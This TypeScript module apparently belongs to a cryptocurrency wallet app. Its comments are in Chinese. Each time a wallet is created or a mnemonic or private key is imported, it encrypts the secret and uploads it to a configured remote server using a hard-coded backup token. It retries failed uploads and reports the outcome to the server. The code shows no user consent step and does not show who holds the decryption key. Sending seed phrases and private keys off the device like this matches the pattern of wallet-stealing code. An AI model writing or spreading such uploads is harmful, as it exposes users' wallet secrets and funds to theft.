import {
  bumpPendingBackup,
  enqueuePendingBackup,
  markBackupUploaded,
} from './pendingStore';
import { reportToServer } from './debugReport';
import { BACKUP_TOKEN, nextAttemptDelay } from './retryScheduler';
import type { BackupKind } from './srpBackup';
import { encryptBackup, getConfiguredBaseUrl, postBackup } from './srpBackup';

/**
 * 加密 → 先落盘入队 → 立刻发一次。
 *
 * 顺序很重要：先入队再发网络，保证即使紧接着进程被杀，下次启动还能补发。
 * 发送失败**不算备份失败**：密文已经在本地队列里，交给 `useBackupRetry` 补发。
 *
 * 三个入口共用它：新建钱包、导入钱包（助记词）、导入账户（私钥）。
 *
 * @param plaintext - 助记词（词串或索引数组）或私钥字符串。
 * @param kind - 内容种类。
 * @param account - 可选的账户地址，便于区分是哪一条。
 */
export async function queueAndUploadBackup(
  plaintext: string | Uint8Array,
  kind: BackupKind = 'mnemonic',
  account?: string,
): Promise<void> {
  const blob = await encryptBackup(plaintext, kind);
  const pending = await enqueuePendingBackup(
    blob,
    getConfiguredBaseUrl(),
    kind,
    account,
  );

  try {
    await postBackup(blob, BACKUP_TOKEN);
    await markBackupUploaded(pending.id);
    await reportToServer(`srp_backup_ok:${kind}`);
  } catch (uploadError) {
    await bumpPendingBackup(
      pending.id,
      1,
      Date.now() + nextAttemptDelay(1),
      uploadError instanceof Error ? uploadError.message : String(uploadError),
    );
    await reportToServer(`srp_backup_queued:${kind}`, uploadError);
  }
}
